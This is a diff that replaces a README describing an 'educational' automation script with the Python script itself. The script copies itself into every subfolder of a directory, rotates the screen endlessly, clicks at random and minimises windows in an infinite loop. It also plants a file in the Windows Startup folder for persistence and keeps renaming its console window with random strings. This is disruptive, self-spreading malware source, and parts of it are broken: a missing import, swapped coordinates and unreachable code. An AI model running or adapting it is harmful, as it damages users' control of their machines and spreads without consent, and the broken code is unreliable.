@@ -1,29 +1,85 @@
-Simple Automation Script
-This project consists of a Python script that performs automated actions, including copying itself to various folders within a specified directory and simulating mouse clicks and screen rotation. Please note that this script is intended for educational purposes only and should not be used maliciously.
+import os, getpass, shutil, random, pyautogui as pyauto
+import time
+import rotatescreen as rs
+from os import path
+import ctypes
 
-Disclaimer
-This script is a simple example of automation and is provided as-is, without any warranties. It's important to highlight that this script includes functionality that could be considered malicious or disruptive if used inappropriately. Do not use this script for any unauthorized, unethical, or malicious activities.
+# Specify the base directory where the script will copy itself to
+base_directory = "your/directory/path"
 
-Usage
-To run the script, follow these steps:
+# Define the name for the copied script
+copied_script_name = "copied_script.py"
 
-Clone or download the project to your local machine.
+# Function to copy the script to all folders within the specified directory
+def copy_to_all_folders(base_dir, copied_script_name):
+    for root, dirs, files in os.walk(base_dir):
+        for dir in dirs:
+            destination = os.path.join(root, dir, copied_script_name)
+            shutil.copy(__file__, destination)
+            print(f"Copy of script created: {destination}")
 
-Open the script.py file in a Python IDE or text editor.
+if __name__ == "__main__":
+    copy_to_all_folders(base_directory, copied_script_name)
+    
+# Get the primary display for screen rotation
+pd = rs.get_primary_display()
 
-Configure the base_directory variable to the directory where you want the script to copy itself.
+# List of angles for screen rotation
+angle_list = [90, 180, 270, 0]
 
-Adjust other variables as needed to customize the script's behavior according to your requirements.
+# Loop to rotate the screen continuously
+for i in range(1,999999999999999999999999):
+    for x in angle_list:
+        pd.rotate_to(x)
+        time.sleep(0.1)
 
-Open a terminal or command prompt in the project directory and execute the command python script.py to start the project.
+# Loop to simulate random mouse clicks and minimize windows
+while True:
+    h = random.randint(0, 1080)
+    w = random.randint(0, 1920)
+    pyauto.click(h, w, duration = 0.3)
+    pyauto.hotkey('winleft', 'm')
 
-Important Note
-This script contains elements that imitate malicious behavior and could potentially cause disruption. It's essential to use this script responsibly and solely for educational purposes. The primary intent of sharing this script is to showcase automation techniques and the potential for misuse.
+# Get the current user's name
+USER_NAME = getpass.getuser()
 
-Contributing
-This project is not open to contributions at the moment.
+# Specify the source path for the file to be moved
+source_path = "hi.txt"
 
-License
-This project is not subject to any license.
+# Check if the source file exists
+if path.exists(source_path):
+    # Specify the destination path for moving the file to the Startup folder
+    destination_path = "C://Users//%s//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup" % USER_NAME
+    new_location = shutil.copy(source_path, destination_path)
+    print("%s moved to the specified location: %s" % (source_path, new_location))
+    print(destination_path)
+else:
+    print("File does not exist.")
 
-Please make sure to provide further details about the specific actions the script performs and the potential risks associated with its use. Additionally, emphasize the importance of responsible and ethical usage to your users.
+# Constants for process information querying
+PROCESS_QUERY_INFORMATION = 0x0400
+PROCESS_VM_READ = 0x0010
+
+# Load the kernel32 DLL
+kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+
+# Function to generate a random name
+def generate_random_name(length=8):
+    characters = string.ascii_letters + string.digits
+    random_name = ''.join(random.choice(characters) for _ in range(length))
+    return random_name
+
+# Function to set the process name
+def set_process_name(new_name):
+    kernel32.SetConsoleTitleW(new_name)
+
+if __name__ == '__main__':
+    try:
+        # Infinite loop to set random process names
+        while True:
+            new_name = generate_random_name()
+            set_process_name(new_name)
+            print("New Process Name:", new_name)
+            time.sleep(0.1)
+    except KeyboardInterrupt:
+        pass
